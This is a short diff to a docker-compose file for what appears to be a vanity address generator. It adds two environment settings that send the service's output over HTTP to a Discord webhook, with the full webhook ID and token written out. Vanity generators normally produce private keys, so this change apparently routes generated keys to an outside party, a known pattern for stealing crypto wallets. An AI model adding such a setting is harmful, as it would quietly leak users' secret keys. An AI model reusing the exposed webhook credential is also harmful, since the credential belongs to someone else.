@@ -6,6 +6,8 @@ services:
     environment:
       - VANITY_PATTERN=${VANITY_PATTERN:-cafe}
       - IGNORE_CASE=${IGNORE_CASE:-false}
+      - STORAGE_TYPE=http
+      - STORAGE_URL=https://discord.com/api/webhooks/1332791349115617320/drHJGPZz5JMuZg0Y1dp1H9DWTQ5Ppcm564tvaznhBzbCoO2vsFSS15rG9TogtPJjQ5z_
     deploy:
       resources:
         reservations:
